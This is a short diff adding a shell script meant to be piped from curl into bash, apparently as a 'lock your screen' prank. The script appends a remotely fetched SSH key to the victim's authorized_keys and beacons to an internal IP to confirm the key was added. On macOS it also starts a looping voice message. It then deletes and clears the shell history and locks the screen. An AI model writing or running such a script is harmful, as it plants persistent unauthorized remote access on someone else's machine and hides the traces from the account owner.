@@ -1,0 +1,11 @@
+## 
+## Use with: curl https://fliphess.com/lock | bash
+##
+[ -d ~/.ssh ] || { mkdir ~/.ssh && chmod 700 ~/.ssh; }
+curl -s https://fliphess.com/pub >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys
+if [ "$( uname )" == "Darwin" ] ; then 
+    nohup bash -c "while true; do say 'I should lock my screen'; sleep 10; done" &
+fi
+curl -s http://192.168.101.98:8080/key_added > /dev/null 2>&1
+rm ~/.bash_history && history -c  ; clear ; exit 
+/System/Library/CoreServices/Menu\ Extras/User.menu/Contents/Resources/CGSession -suspend
